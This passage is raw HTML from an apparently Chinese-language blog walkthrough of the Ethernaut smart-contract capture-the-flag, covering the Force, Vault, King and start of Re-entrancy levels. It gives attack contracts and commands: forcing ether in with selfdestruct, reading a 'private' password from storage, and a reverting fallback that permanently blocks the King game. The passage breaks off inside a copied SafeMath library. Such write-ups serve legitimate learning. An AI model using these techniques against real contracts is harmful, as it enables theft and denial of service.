class=\"line-numbers language-none\"><code class=\"language-none\">var hold = web3.utils.keccak256(\"pwn()\")\ncontract.sendTransaction({data:hold})<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<h2 id=\"8-Force\"><a href=\"#8-Force\" class=\"headerlink\" title=\"8.Force\"></a>8.Force</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Force</span> <span class=\"token punctuation\">{</span><span class=\"token comment\">/*\n\n                   MEOW ?\n         /\\_/\\   /\n    ____/ o o \\\n  /~____  =ø= /\n (______)__m_m)\n\n*/</span><span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>分析：一个空合约，如何使其余额&gt;0 ？？？</p>\n<p>可以写一个合约，给其一定的余额，然后利用<code>selfdestruct</code>方法把钱转到空合约里面</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">deleteContract</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">deleteIt</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _addr<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">selfdestruct</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        balance<span class=\"token operator\">=</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>Tip:构造函数为<code>payable</code>，部署时给合约部署1Wei的余额，自毁时，把钱转入空合约中（也就是这个Instance address里面）</p></blockquote>\n<h2 id=\"9-Vault\"><a href=\"#9-Vault\" class=\"headerlink\" title=\"9.Vault\"></a>9.Vault</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Vault</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token builtin\">bool</span> <span class=\"token keyword\">public</span> locked<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">private</span> password<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span> _password<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    locked <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    password <span class=\"token operator\">=</span> _password<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">unlock</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span> _password<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>password <span class=\"token operator\">==</span> _password<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      locked <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>关于状态变量在存储中的布局：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">每个存储槽将使用32个字节（一个字大小）；\n对于每个变量来说，会根据其类型确定以字节为单位的大小；\n如果可能的话，少于32字节的多个连续字段将根据以下规则被装入一个存储槽；\n一个存储槽中的第一个项目以低位对齐的方式存储。\n值类型只使用存储它们所需的字节数。\n如果一个值类型在一个存储槽的剩余部分放不下，它将被存储在下一个存储槽。\n结构和数组数据总是从一个新的存储槽开始，它们的项目根据这些规则被紧密地打包。\n结构或数组数据后面的项目总是开始一个新的存储槽。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote>\n<p><img src=\"https://s2.loli.net/2023/03/24/dMXO7oVlZN9jEAP.png\" alt=\"image-20230116150917588.png\"></p>\n<p><code>password</code>在slot1（查看方法写在后面第13题）</p>\n<p>使用<code>getStorageAt</code>获取：</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\">await web3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span><span class=\"token function\">getStorageAt</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x578546AB0b765818E84ac03aaBa9eA942a9480B5\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"C:\\Users\\16017\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230116151208154.png\" alt=\"image-20230116151208154\"></p>\n<p>提交即可</p>\n<h2 id=\"10-King\"><a href=\"#10-King\" class=\"headerlink\" title=\"10.King\"></a>10.King</h2><p>题目要求：成为合约的king，并且永远不被别人取代<img src=\"https://s2.loli.net/2023/03/24/Ex3X8tDOTgl9zZI.png\" alt=\"image-20230124230346470.png\"></p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">King</span> <span class=\"token punctuation\">{</span>\n\n  <span class=\"token builtin\">address</span> king<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> prize<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n    owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>  \n    king <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    prize <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">&gt;=</span> prize <span class=\"token operator\">||</span> msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> owner<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>king<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    king <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    prize <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">_king</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> king<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>查询该地址余额为0.001ETH，需要转入更多的钱成为king，并且不被别人取代</p>\n<p>需要在构造攻击合约的fallback函数中加个<code>revert()</code>，不接受转账，永远成为king</p>\n<p>攻击合约：</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">callETH</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// 处理下call的返回值，如果失败，revert交易并发送error</span>\n    <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> _to<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> amount<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>success<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Transfer failed.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token function\">fallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">revert</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://s2.loli.net/2023/03/24/MBLuEYnNkHOt8J9.png\" alt=\"image-20230125102617943.png\"></p>\n<h2 id=\"11-Re-entrancy\"><a href=\"#11-Re-entrancy\" class=\"headerlink\" title=\"11.Re-entrancy\"></a>11.Re-entrancy</h2><p>重入攻击</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.12</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">'./SafeMath.sol'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Reentrance</span> <span class=\"token punctuation\">{</span>\n  \n  <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=&gt;</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> balances<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">donate</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n    balances<span class=\"token punctuation\">[</span>_to<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> balances<span class=\"token punctuation\">[</span>_to<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _who<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> balance<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> balances<span class=\"token punctuation\">[</span>_who<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">&gt;=</span> _amount<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> result<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span>_amount<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        _amount<span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">}</span>\n      balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> _amount<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>有点小问题就是题目给我的safemath库没有，就去openzepplin找了一个safemath库拷到本地，由于新版本，所以还要再修改一下</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token comment\">// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)</span>\n\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.12</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// CAUTION</span>\n<span class=\"token comment\">// This version of SafeMath should only be used with Solidity 0.8 or later,</span>\n<span class=\"token comment\">// because it relies on the compiler's built in overflow checks.</span>\n\n<span class=\"token comment\">/**\n * @dev Wrappers over Solidity's arithmetic operations.\n *\n * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler\n * now has built in overflow checking.\n */</span>\n<span class=\"token keyword\">library</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">/**\n     * @dev Returns the addition of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">tryAdd</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> a<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> b<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// unchecked </span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token builtin\">uint256</span> c <span class=\"token operator\">=</span> a <span class=\"token operator\">+</span> b<span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>c <span class=\"token operator\">&lt;</span> a<span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">trySub</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> a<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> b<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// unchecked</span>\n         <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">&gt;</span> a<span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> a <span class=\"token operator\">-</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">tryMul</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> a<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> b<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// unchecked</span>\n         <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">// Gas optimization: this is cheaper than requiring 'a' not being zero, but the</span>\n            <span class=\"token comment\">// benefit is lost if 'b' is also tested.</span>\n            <span class=\"token comment\">// See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>a <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token builtin\">uint256</span> c <span class=\"token operator\">=</span> a <span class=\"token operator\">*</span> b<span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>c <span class=\"token operator\">/</span> a <span class=\"token operator\">!=</span> b<span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev Returns the division of two unsigned integers, with a division by zero flag.\n     *\n     * _Available since v3.4._\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">tryDiv</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> a<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> b<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// unchecked</span>\n         <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> a <span class=\"token operator\">/</span> b<span 